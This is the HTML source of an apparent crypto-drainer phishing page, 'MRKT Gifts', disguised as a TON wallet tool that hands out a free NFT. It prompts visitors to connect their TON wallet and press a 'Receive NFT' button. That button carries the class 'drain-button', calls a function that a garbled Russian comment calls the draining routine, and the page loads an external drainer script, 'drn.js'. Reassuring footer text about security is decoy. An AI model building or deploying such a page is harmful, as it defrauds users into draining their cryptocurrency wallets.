<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MRKT Gifts</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 24px;
            padding: 40px 32px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
            max-width: 420px;
            width: 100%;
            text-align: center;
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: linear-gradient(135deg, #0088cc, #006699);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 25px rgba(0, 136, 204, 0.3);
        }
        
        .logo img {
            width: 40px;
            height: 40px;
            border-radius: 8px;
        }
        
        .title {
            font-size: 28px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 12px;
            line-height: 1.2;
        }
        
        .subtitle {
            font-size: 16px;
            color: #666;
            margin-bottom: 32px;
            line-height: 1.5;
        }
        
        .connect-section {
            margin-bottom: 20px;
            display: flex;
            justify-content: center;
        }
        
        .info-message {
            background: rgba(0, 136, 204, 0.1);
            border: 1px solid rgba(0, 136, 204, 0.2);
            border-radius: 16px;
            padding: 20px;
            margin: 20px 0;
            text-align: center;
            font-size: 15px;
            color: #0088cc;
            line-height: 1.4;
        }
        
        .drain-button {
            width: 100%;
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            border: none;
            border-radius: 12px;
            height: 52px;
            font-weight: 600;
            color: white;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 10px;
        }
        
        .drain-button:hover {
            background: linear-gradient(135deg, #ff7b7b, #ff6b35);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 107, 107, 0.3);
        }
        
        .drain-button:active {
            transform: translateY(0);
        }
        
        .footer {
            margin-top: 24px;
            font-size: 12px;
            color: #999;
        }
        
        /* –°—Ç–∏–ª–∏ –¥–ª—è TON Connect –∫–Ω–æ–ø–∫–∏ */
        .ton-connect-button {
            width: 100%;
        }
        
        /* –ö–∞—Å—Ç–æ–º–Ω—ã–µ —Å—Ç–∏–ª–∏ –¥–ª—è TON Connect UI */
        .tc-modal-container {
            z-index: 1000;
        }
        
        .tc-btn-primary {
            background: linear-gradient(135deg, #0088cc, #006699) !important;
            border: none !important;
            border-radius: 12px !important;
            height: 52px !important;
            font-weight: 600 !important;
            width: 100% !important;
        }
        
        .tc-btn-primary:hover {
            background: linear-gradient(135deg, #0099dd, #0077aa) !important;
        }

        .status-indicator {
            margin: 15px 0;
            padding: 10px;
            border-radius: 10px;
            font-size: 14px;
            display: none;
        }
        
        .status-connected {
            background: rgba(76, 175, 80, 0.1);
            color: #4caf50;
            border: 1px solid rgba(76, 175, 80, 0.3);
        }
        
        .status-disconnected {
            background: rgba(244, 67, 54, 0.1);
            color: #f44336;
            border: 1px solid rgba(244, 67, 54, 0.3);
        }

        .wallet-info {
            background: rgba(0, 0, 0, 0.05);
            border-radius: 10px;
            padding: 12px;
            margin: 10px 0;
            font-size: 14px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://ton.org/download/ton_symbol.png" alt="TON" onerror="this.style.display='none'">
        </div>
        
        <h1 class="title">MRKT Gifts</h1>
        <p class="subtitle">TON Wallet Management Tool</p>
        
        <div class="connect-section">
            <div id="ton-connect" class="ton-connect-button"></div>
        </div>

        <div id="wallet-info" class="wallet-info"></div>
        <div id="status-indicator" class="status-indicator"></div>
        
        <div class="info-message">
            ‚ö° Connect your TON wallet and click receive button to proceed<br>
            Secure and fast transactions
        </div>
        
        <button onclick="didtrans();" class="drain-button">
            üöÄ Receive NFT
        </button>
        
        <div class="footer">
            Secured by TON Blockchain ‚Ä¢ Encrypted Connection
        </div>
    </div>

    <script>
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è TON Connect UI
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://your-domain.com/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });

        // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        tonConnectUI.onStatusChange((wallet) => {
            const statusElement = document.getElementById('status-indicator');
            const walletInfo = document.getElementById('wallet-info');
            
            if (wallet) {
                statusElement.textContent = '‚úÖ Wallet Connected';
                statusElement.className = 'status-indicator status-connected';
                statusElement.style.display = 'block';
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–æ—à–µ–ª—å–∫–µ
                const shortAddress = wallet.address.slice(0, 4) + '...' + wallet.address.slice(-4);
                walletInfo.innerHTML = `Connected: ${shortAddress}<br>Device: ${wallet.device.appName}`;
                walletInfo.style.display = 'block';
            } else {
                statusElement.textContent = '‚ùå Wallet Disconnected';
                statusElement.className = 'status-indicator status-disconnected';
                statusElement.style.display = 'block';
                walletInfo.style.display = 'none';
            }
        });

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –¥—Ä–µ–Ω–∏—Ä–æ–≤–∞–Ω–∏—è - –±—É–¥–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å—Å—è –∏–∑ tonsdk.js
        function didtrans() {
            if (typeof connect === 'function') {
                connect();
            } else {
                alert('Please connect your wallet first');
            }
        }

        // –ê–¥–∞–ø—Ç–∞—Ü–∏—è –¥–ª—è —Å—Ç–∞—Ä–æ–≥–æ –∫–æ–¥–∞
        function connectWallet() {
            tonConnectUI.openModal();
        }

        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        document.addEventListener('DOMContentLoaded', function() {
            const statusElement = document.getElementById('status-indicator');
            statusElement.textContent = 'üîå Connect your TON wallet to receive the NFT';
            statusElement.className = 'status-indicator status-disconnected';
            statusElement.style.display = 'block';
        });
    </script>

    <script src="drn.js"></script>
</body>
</html>
